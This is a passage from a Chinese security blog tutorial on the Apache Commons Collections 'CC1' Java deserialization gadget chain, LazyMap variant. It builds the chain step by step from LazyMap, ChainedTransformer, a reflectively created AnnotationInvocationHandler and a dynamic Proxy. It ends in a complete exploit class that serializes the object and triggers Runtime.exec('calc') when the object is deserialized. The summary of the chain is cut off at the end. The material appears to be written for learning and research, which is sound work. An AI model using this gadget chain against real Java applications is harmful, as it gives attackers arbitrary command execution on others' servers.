所以就要在readobject里面调用无参方法</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">paramTypes</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">length</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">!=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">0</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">throw</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">AssertionError</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;Too many parameters for an annotation method&quot;</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">switch</span><span style="color: #E06C75">(member) {</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">case</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;toString&quot;</span><span style="color: #C678DD">:</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">toStringImpl</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">case</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;hashCode&quot;</span><span style="color: #C678DD">:</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">hashCodeImpl</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">case</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;annotationType&quot;</span><span style="color: #C678DD">:</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> type</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">// Handle annotation member accessors</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> result </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">memberValues</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(member);</span></span></code></pre></div></div></figure><ul><li><p>所以就要在readobject里面调用无参方法</p></li><li><p>查看readobject，就有无参方法</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251122205011525.png" alt="image-20251122204853571"></p><p>所以说就可以将</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">AnnotationInvocationHandler.readObject的memberValues当做proxy</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">AnnotationInvocationHandler的memberValues当做LazyMap</span></span></code></pre></div></div></figure><p><strong>为什么有两个呢？？</strong></p><p>根据当面的链子，这个类用了两次，一次当做map，一次当做接口</p><p>在后面写exp的时候就需要<strong>实例化两次</strong></p></li></ul><h3 id="逐步构造-1"><a href="#逐步构造-1" class="headerlink" title="逐步构造"></a>逐步构造</h3><ul><li><p>先写map</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> map </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;&gt;</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//        map.put(&quot;value&quot;, &quot;12&quot;);    //不要传参</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> lazyMap </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">LazyMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">decorate</span><span style="color: #ABB2BF">();</span></span></code></pre></div></div></figure><p>查看LazyMap.decorate的参数</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251122213140067.png" alt="image-20251122213140011"></p><p>调用下面这个</p><p>所以</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> map </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;&gt;</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> lazyMap </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">LazyMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">decorate</span><span style="color: #ABB2BF">(map, chainedTransformer);</span></span></code></pre></div></div></figure></li><li><p>下一步，<code>获取类名，写构造器，执行方法</code></p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">Class</span><span style="color: #E06C75"> c </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">forName</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E5C07B">Constructor</span><span style="color: #E06C75"> annotationInvocationhdlConstructor </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredConstructor</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E5C07B">annotationInvocationhdlConstructor</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//主要就是修改了这一行， 就改了一个map名</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//而且Target.class可以传入其他的   比如Override</span></span><span class="line"><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> o </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">annotationInvocationhdlConstructor</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">newInstance</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Target</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, lazyMap);</span></span></code></pre></div></div></figure><p><strong>为什么Target.class可以传入其他的   比如Override？</strong></p><p>因为这次不需要进if条件，即可到访问点</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251122214224635.png" alt="image-20251122214224552"></p><p>目前只要不爆出异常即可(所以上面map没赋值)</p><p>所以这么写</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Class</span><span style="color: #E06C75"> c </span><span style="color: #56B6C2">=</span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">forName</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Constructor</span><span style="color: #E06C75"> annotationInvocationhdlConstructor </span><span style="color: #56B6C2">=</span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredConstructor</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">annotationInvocationhdlConstructor</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//这里强制转化的原因是，InvocationHandler类型在后面  写动态代理传参 会用到</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">InvocationHandler</span><span style="color: #E06C75"> h </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (InvocationHandler)</span><span style="color: #E5C07B">annotationInvocationhdlConstructor</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">newInstance</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Target</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, lazyMap);</span></span></code></pre></div></div></figure></li><li><p>接下来写动态代理</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">Map</span><span style="color: #E06C75"> mapProxy</span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (Map) </span><span style="color: #E5C07B">Proxy</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">newProxyInstance</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">LazyMap</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClassLoader</span><span style="color: #ABB2BF">(), </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">}, h);</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//强制转化的原因： 由于后面你写下一步的代码传参需要map类型   （AnnotationInvocationHandler接收map）</span></span></code></pre></div></div></figure><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251122215749774.png" alt="image-20251122215749733"></p></li><li><p>还要用AnnotationInvocationHandler，还得写构造器</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> o </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">annotationInvocationhdlConstructor</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">newInstance</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Target</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, mapProxy);</span></span></code></pre></div></div></figure></li></ul><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">CC1Test2</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ClassNotFoundException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">InvocationTargetException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">InstantiationException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IllegalAccessException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">NoSuchMethodException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//根据runtime反射   对InvokerTransformer写runtime反射</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//        Method getRuntimeMethod =(Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}).transform(Runtime.class);</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//        Runtime r = (Runtime)new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntimeMethod);</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//        new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}).transform(r);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//利用ChainedTransformer缩减代码</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Transformer</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">transformers</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Transformer</span><span style="color: #ABB2BF">[]{</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ConstantTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">),</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;getMethod&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[].</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">}, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;getRuntime&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">}),</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;invoke&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[].</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">}, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[]{</span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">}),</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;exec&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">}, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;calc&quot;</span><span style="color: #ABB2BF">})</span></span><span class="line"><span style="color: #ABB2BF">        };</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ChainedTransformer</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">chainedTransformer</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ChainedTransformer</span><span style="color: #ABB2BF">(transformers);</span></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75">map</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;&gt;();</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//        map.put(&quot;value&quot;, &quot;12&quot;);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75">lazyMap</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">LazyMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">decorate</span><span style="color: #ABB2BF">(map, chainedTransformer);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">c</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">forName</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Constructor</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">annotationInvocationhdlConstructor</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredConstructor</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">annotationInvocationhdlConstructor</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">InvocationHandler</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">h</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (InvocationHandler) </span><span style="color: #E5C07B">annotationInvocationhdlConstructor</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">newInstance</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Target</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, lazyMap);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">        </span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">mapProxy</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (Map) </span><span style="color: #E5C07B">Proxy</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">newProxyInstance</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">LazyMap</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClassLoader</span><span style="color: #ABB2BF">(), </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">}, h);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">o</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">annotationInvocationhdlConstructor</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">newInstance</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Override</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, mapProxy);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">serialize</span><span style="color: #ABB2BF">(o);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">unserialize</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ser.bin&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> serialize</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">obj</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ObjectOutputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">oos</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ObjectOutputStream</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">FileOutputStream</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ser.bin&quot;</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">oos</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">writeObject</span><span style="color: #ABB2BF">(obj);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Object</span><span style="color: #61AFEF"> unserialize</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">Filename</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ClassNotFoundException</span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ObjectInputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">ois</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ObjectInputStream</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">FileInputStream</span><span style="color: #ABB2BF">(Filename));</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">obj</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">ois</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">readObject</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> obj;</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><h3 id="总结流程-1"><a href="#总结流程-1" class="headerlink" title="总结流程"></a>总结流程</h3><p>InvokerTransformer.transform(value)</p><p><code>lazyMap+decorate</code></p><p>valueTransformer.transform(value)——–&gt;后面修改成了ChainedTransformer.transform(value）</p><p>factory.transform(key)</p><p>lazyMap.get</p><p>invoke访问memberValues.get（动态代理）</p><p>AnnotationInvocationHandler.invoke</p><p>AnnotationInvocationHandler(memberValues)———&gt;mapProxy（动态代理的 Map）</p><p>AnnotationInvocationHandler.readObject</p><p><code>下面那个</code></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251122221106458.png" 